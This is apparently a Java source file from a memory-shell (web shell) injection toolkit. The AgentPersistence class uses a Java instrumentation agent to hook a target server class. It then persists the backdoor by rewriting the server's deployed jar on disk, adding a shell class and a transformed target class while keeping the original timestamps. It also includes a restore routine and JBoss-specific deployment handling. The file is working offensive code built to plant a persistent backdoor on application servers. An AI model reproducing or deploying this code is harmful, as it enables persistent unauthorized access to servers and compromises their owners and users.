package com.reajason.javaweb.agent;

import org.objectweb.asm.ClassReader;

import java.io.ByteArrayOutputStream;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.net.JarURLConnection;
import java.net.URL;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

/**
 * Runtime persistence and restore support embedded into Agent injectors that declare a persist method.
 */
public final class AgentPersistence {
    private AgentPersistence() {
    }

    public interface Transformer {
        byte[] transform(ClassLoader loader, byte[] classBytes) throws Exception;
    }

    public static boolean isPersistent(String args) {
        return hasFlag(args, "persist=true");
    }

    public static boolean isRestore(String args) {
        return hasFlag(args, "restore=true");
    }

    private static boolean hasFlag(String args, String flag) {
        if (args == null) {
            return false;
        }
        for (String arg : args.split(",")) {
            if (flag.equalsIgnoreCase(arg.trim())) {
                return true;
            }
        }
        return false;
    }

    /**
     * Registers the agent hook and, when requested, persists it into the target jar or restores it.
     *
     * @return the registered transformer, or {@code null} when restoring
     */
    public static ClassFileTransformer launch(String args, Instrumentation inst,
                                              ClassFileTransformer previous,
                                              AgentInjectorSupport.Config config,
                                              String shellClassName, String shellBase64) throws Exception {
        System.out.println("MemShell Agent is starting");
        boolean restore = isRestore(args);
        boolean persist = !restore && isPersistent(args);
        boolean targetFound = false;
        if (previous != null) {
            inst.removeTransformer(previous);
        }
        ClassFileTransformer transformer = null;
        if (!restore) {
            transformer = AgentInjectorSupport.create(config, shellClassName, shellBase64);
            inst.addTransformer(transformer, true);
        }
        for (Class<?> loadedClass : inst.getAllLoadedClasses()) {
            if (!config.matches(loadedClass.getName())) {
                continue;
            }
            targetFound = true;
            if (restore) {
                restore(inst, loadedClass);
            } else {
                inst.retransformClasses(loadedClass);
                if (persist) {
                    persist(loadedClass, config, shellClassName, shellBase64);
                }
            }
        }
        if (restore && !targetFound) {
            throw new IllegalStateException("Cannot restore before " + config.describeTarget() + " is loaded");
        }
        if (persist && !targetFound) {
            throw new IllegalStateException("Cannot persist before " + config.describeTarget() + " is loaded");
        }
        return transformer;
    }

    public static File persist(Class<?> targetClass, AgentInjectorSupport.Config config,
                               String shellClassName, String shellBase64) throws Exception {
        return persist(targetClass, config, shellClassName,
                AgentInjectorSupport.gzipDecompress(AgentInjectorSupport.decodeBase64(shellBase64)));
    }

    public static File persist(Class<?> targetClass, final AgentInjectorSupport.Config config,
                               final String shellClassName, byte[] shellClassBytes) throws Exception {
        return persist(targetClass, shellClassName, shellClassBytes, new Transformer() {
            @Override
            public byte[] transform(ClassLoader loader, byte[] classBytes) {
                return AgentInjectorSupport.transformClass(loader, classBytes, config, shellClassName);
            }
        });
    }

    public static File persist(Class<?> targetClass, final String shellClassName,
                               byte[] shellClassBytes, Transformer transformer) throws Exception {
        File originalJar = resolveTargetJar(targetClass);

        if (!new ClassReader(shellClassBytes).getClassName().equals(shellClassName.replace('.', '/'))) {
            throw new IllegalArgumentException("Shell class name does not match its bytecode: " + shellClassName);
        }
        File backupJar = backupJar(originalJar);
        if (backupJar.exists()) {
            throw new IllegalStateException("Backup already exists; restore it before persisting again: " + backupJar);
        }

        File tempJar = File.createTempFile(originalJar.getName(), ".tmp", originalJar.getParentFile());
        try {
            rewriteJar(originalJar, tempJar, targetClass, shellClassName, shellClassBytes, transformer);
            createBackup(originalJar, backupJar);
            replaceJar(tempJar, originalJar, backupJar);
        } finally {
            if (tempJar.exists()) {
                tempJar.delete();
            }
        }
        System.out.println("MemShell Agent persisted " + originalJar);
        System.out.println("Original jar backup: " + backupJar);
        System.out.println("Restore with the same agent jar and restore=true, or after shutdown: cp -p "
                + backupJar + " " + originalJar);
        return backupJar;
    }

    /**
     * Undoes {@link #persist}: restores the original jar from its backup and rewrites the loaded
     * target class back to the pristine bytecode, so the running server drops the injected hook too.
     */
    public static File restore(Instrumentation instrumentation, Class<?> targetClass) throws Exception {
        File originalJar = resolveTargetJar(targetClass);
        File backupJar = backupJar(originalJar);
        if (!backupJar.isFile()) {
            throw new IllegalStateException("No persistence backup to restore: " + backupJar);
        }
        String targetEntryName = targetClass.getName().replace('.', '/') + ".class";
        byte[] originalClassBytes;
        JarFile backup = new JarFile(backupJar);
        try {
            JarEntry targetEntry = backup.getJarEntry(targetEntryName);
            if (targetEntry == null) {
                throw new IllegalStateException("Target class not found in " + backupJar + ": " + targetEntryName);
            }
            originalClassBytes = readEntry(backup, targetEntry);
        } finally {
            backup.close();
        }

        restoreJar(backupJar, originalJar);
        try {
            instrumentation.redefineClasses(new ClassDefinition(targetClass, originalClassBytes));
        } catch (Exception e) {
            throw new IllegalStateException("Jar restored, but the running class could not be restored; restart the server: "
                    + targetClass.getName(), e);
        }
        if (!backupJar.delete()) {
            System.out.println("Cannot delete restored jar backup: " + backupJar);
        }
        System.out.println("MemShell Agent restored " + originalJar);
        return originalJar;
    }

    private static File backupJar(File originalJar) {
        return new File("/tmp", originalJar.getName() + ".bak");
    }

    private static File resolveTargetJar(Class<?> targetClass) throws Exception {
        ProtectionDomain protectionDomain = targetClass.getProtectionDomain();
        CodeSource codeSource = protectionDomain == null ? null : protectionDomain.getCodeSource();
        URL location = codeSource == null ? null : codeSource.getLocation();
        if (location != null && "jar".equalsIgnoreCase(location.getProtocol())) {
            location = ((JarURLConnection) location.openConnection()).getJarFileURL();
        }
        if (location == null) {
            throw new IllegalStateException("Cannot modify a class loaded from null");
        }
        File originalJar;
        if ("file".equalsIgnoreCase(location.getProtocol())) {
            originalJar = new File(location.toURI());
        } else if ("vfs".equalsIgnoreCase(location.getProtocol())) {
            originalJar = new File(location.toURI().getPath());
        } else {
            throw new IllegalStateException("Cannot modify a class loaded from " + location);
        }
        originalJar = resolveDeploymentJar(originalJar);
        if (!originalJar.isFile()) {
            throw new IllegalStateException("Agent target code source is not a jar: " + originalJar);
        }
        return originalJar;
    }

    private static void restoreJar(File backupJar, File originalJar) throws IOException {
        File tempJar = File.createTempFile(originalJar.getName(), ".tmp", originalJar.getParentFile());
        try {
            copyFile(backupJar, tempJar);
            replaceJar(tempJar, originalJar, backupJar);
        } finally {
            if (tempJar.exists()) {
                tempJar.delete();
            }
        }
        originalJar.setLastModified(backupJar.lastModified());
    }

    private static File resolveDeploymentJar(File originalJar) throws IOException {
        String serverHome = System.getProperty("jboss.server.home.dir");
        String serverTemp = System.getProperty("jboss.server.temp.dir");
        if (serverHome == null || serverTemp == null || originalJar.getParentFile() == null
                || !originalJar.getParentFile().getCanonicalFile().equals(
                new File(serverTemp, "deploy").getCanonicalFile())) {
            return originalJar;
        }

        String fileName = originalJar.getName();
        int nameStart = 0;
        if (fileName.startsWith("tmp")) {
            nameStart = 3;
            while (nameStart < fileName.length() && Character.isDigit(fileName.charAt(nameStart))) {
                nameStart++;
            }
        }
        String deployedName = nameStart > 0 && nameStart < fileName.length()
                ? fileName.substring(nameStart) : fileName;
        List<File> candidates = new ArrayList<File>();
        findNamedFiles(new File(serverHome, "deploy"), deployedName, candidates);
        File deploymentJar = null;
        for (File candidate : candidates) {
            if (candidate.length() == originalJar.length() && sameContent(candidate, originalJar)) {
                if (deploymentJar != null) {
                    throw new IllegalStateException("Multiple deployment sources match " + originalJar);
                }
                deploymentJar = candidate;
            }
        }
        if (deploymentJar == null) {
            throw new IllegalStateException("Cannot find the stable deployment source for " + originalJar);
        }
        return deploymentJar;
    }

    private static void findNamedFiles(File directory, String fileName, List<File> matches) {
        File[] files = directory.listFiles();
        if (files == null) {
            return;
        }
        for (File file : files) {
            if (file.isDirectory()) {
                findNamedFiles(file, fileName, matches);
            } else if (file.getName().equals(fileName)) {
                matches.add(file);
            }
        }
    }

    private static boolean sameContent(File first, File second) throws IOException {
        InputStream firstInput = new BufferedInputStream(new FileInputStream(first));
        try {
            InputStream secondInput = new BufferedInputStream(new FileInputStream(second));
            try {
                int firstByte;
                int secondByte;
                do {
                    firstByte = firstInput.read();
                    secondByte = secondInput.read();
                    if (firstByte != secondByte) {
                        return false;
                    }
                } while (firstByte != -1);
                return true;
            } finally {
                secondInput.close();
            }
        } finally {
            firstInput.close();
        }
    }

    private static void createBackup(File originalJar, File backupJar) throws IOException {
        File backupDirectory = backupJar.getParentFile();
        if (!backupDirectory.isDirectory() && !backupDirectory.mkdirs() && !backupDirectory.isDirectory()) {
            throw new IOException("Cannot create backup directory: " + backupDirectory);
        }
        if (!backupJar.createNewFile()) {
            throw new IOException("Backup already exists: " + backupJar);
        }
        boolean copied = false;
        try {
            copyFile(originalJar, backupJar);
            backupJar.setLastModified(originalJar.lastModified());
            copied = true;
        } finally {
            if (!copied) {
                backupJar.delete();
            }
        }
    }

    private static void replaceJar(File tempJar, File originalJar, File backupJar) throws IOException {
        long lastModified = originalJar.lastModified();
        if (tempJar.renameTo(originalJar)) {
            return;
        }
        if (!originalJar.delete()) {
            throw new IOException("Cannot replace " + originalJar + "; original jar is unchanged, backup is " + backupJar);
        }
        if (tempJar.renameTo(originalJar)) {
            return;
        }
        String message = "Cannot move persisted jar into " + originalJar;
        try {
            copyFile(backupJar, originalJar);
            originalJar.setLastModified(lastModified);
        } catch (IOException restoreError) {
            throw new IOException(message + "; restore manually with: cp -p " + backupJar + " " + originalJar, restoreError);
        }
        throw new IOException(message + "; the original jar was restored from " + backupJar);
    }

    private static void rewriteJar(File originalJar, File tempJar, Class<?> targetClass,
                                   String shellClassName, byte[] shellClassBytes,
                                   Transformer transformer) throws Exception {
        String targetEntryName = targetClass.getName().replace('.', '/') + ".class";
        String shellEntryName = shellClassName.replace('.', '/') + ".class";
        boolean targetFound = false;
        JarFile source = new JarFile(originalJar);
        JarOutputStream target = null;
        try {
            target = new JarOutputStream(new FileOutputStream(tempJar));
            Enumeration<JarEntry> entries = source.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                if (shellEntryName.equals(entry.getName())) {
                    throw new IOException("Shell class already exists in " + originalJar + ": " + shellEntryName);
                }
                byte[] entryBytes = readEntry(source, entry);
                if (targetEntryName.equals(entry.getName())) {
                    targetFound = true;
                    entryBytes = transformer.transform(targetClass.getClassLoader(), entryBytes);
                    JarEntry transformedEntry = new JarEntry(entry.getName());
                    transformedEntry.setTime(entry.getTime());
                    target.putNextEntry(transformedEntry);
                } else {
                    target.putNextEntry(copyEntry(entry));
                }
                target.write(entryBytes);
                target.closeEntry();
            }
            if (!targetFound) {
                throw new IOException("Target class not found in " + originalJar + ": " + targetEntryName);
            }
            target.putNextEntry(new JarEntry(shellEntryName));
            target.write(shellClassBytes);
            target.closeEntry();
        } finally {
            try {
                if (target != null) {
                    target.close();
                }
            } finally {
                source.close();
            }
        }
    }

    private static JarEntry copyEntry(JarEntry entry) {
        if (entry.getMethod() != JarEntry.DEFLATED) {
            return new JarEntry(entry);
        }
        // 重新压缩时不能沿用旧的大小和 CRC；这些值由 JarOutputStream 重新计算。
        JarEntry copy = new JarEntry(entry.getName());
        copy.setTime(entry.getTime());
        copy.setComment(entry.getComment());
        copy.setExtra(entry.getExtra());
        return copy;
    }

    private static byte[] readEntry(JarFile jarFile, JarEntry entry) throws IOException {
        InputStream input = jarFile.getInputStream(entry);
        try {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            copy(input, output);
            return output.toByteArray();
        } finally {
            input.close();
        }
    }

    private static void copyFile(File source, File destination) throws IOException {
        InputStream input = new FileInputStream(source);
        try {
            OutputStream output = new FileOutputStream(destination);
            try {
                copy(input, output);
            } finally {
                output.close();
            }
        } finally {
            input.close();
        }
    }

    private static void copy(InputStream input, OutputStream output) throws IOException {
        byte[] buffer = new byte[4096];
        int length;
        while ((length = input.read(buffer)) != -1) {
            output.write(buffer, 0, length);
        }
    }
}
